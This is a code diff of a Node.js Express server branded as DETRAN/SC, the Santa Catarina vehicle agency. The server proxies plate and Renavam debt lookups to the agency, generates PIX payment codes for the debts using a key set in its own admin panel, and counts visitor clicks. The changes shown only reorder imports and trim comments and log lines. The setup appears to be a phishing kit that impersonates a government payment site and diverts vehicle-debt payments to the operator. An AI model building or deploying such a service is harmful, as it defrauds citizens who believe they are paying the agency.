@@ -1,16 +1,16 @@
 const express = require('express');
 const session = require('express-session');
 const axios = require('axios');
-const { CookieJar } = require('tough-cookie');
-const { wrapper } = require('axios-cookiejar-support');
 const path = require('path');
 const fs = require('fs');
 const QRCode = require('qrcode');
 const { payload } = require('pix-payload');
 const cheerio = require('cheerio');
+const { wrapper } = require('axios-cookiejar-support');
+const { CookieJar } = require('tough-cookie');
 
 const app = express();
-const PORT = process.env.PORT || 3001; // 🔥 MUDANÇA: Usa a porta da Vercel
+const PORT = process.env.PORT || 3001;
 
 app.set('trust proxy', true);
 
@@ -51,7 +51,7 @@ function authMiddleware(req, res, next) {
 }
 
 // ============================================================
-// ROTA PRINCIPAL - CONTA CLIQUE E SERVE O INDEX
+// ROTA PRINCIPAL
 // ============================================================
 app.get('/', (req, res) => {
     const db = lerDB();
@@ -80,7 +80,7 @@ app.get('/index.html', (req, res) => {
 });
 
 // ============================================================
-// 🔥 PROXY DE CONSULTA
+// 🔥 PROXY DE CONSULTA (COM AJUSTE PARA VERCEL)
 // ============================================================
 app.post('/api/consultar', async (req, res) => {
     const { placa, renavam } = req.body;
@@ -93,6 +93,7 @@ app.post('/api/consultar', async (req, res) => {
     
     console.log(`🔍 Consultando placa: ${placaLimpa}, renavam: ${renavam}`);
 
+    // 🔥 CRIA O CLIENTE AXIOS COM COOKIE JAR
     const jar = new CookieJar();
     const client = wrapper(axios.create({ jar, withCredentials: true }));
 
@@ -249,7 +250,7 @@ app.post('/api/consultar', async (req, res) => {
 });
 
 // ============================================================
-// 🔥 GERAR PIX - USANDO A CHAVE CADASTRADA NO PAINEL
+// 🔥 GERAR PIX
 // ============================================================
 app.post('/api/gerar-pix', (req, res) => {
     const { placa, valor, debitos } = req.body;
@@ -506,17 +507,12 @@ app.post('/api/admin/clear-logs', authMiddleware, (req, res) => {
 // ============================================================
 // 🔥 INICIAR SERVIDOR
 // ============================================================
-// 🔥 PARA RODAR NA VERCEL - Exporta o app
 module.exports = app;
 
-// 🔥 SE RODAR LOCALMENTE (npm start)
 if (require.main === module) {
     app.listen(PORT, () => {
         console.log(`🚀 Servidor DETRAN/SC rodando na porta ${PORT}`);
         console.log(`📍 Acesse: http://localhost:${PORT}`);
         console.log(`✅ Cookies do DETRAN/SC configurados!`);
-        console.log(`✅ Servidor pronto para consultas com débitos reais!`);
-        console.log(`✅ Cliques são registrados ao acessar a raiz (/)`);
-        console.log(`✅ Chave PIX é usada do painel admin`);
     });
 }
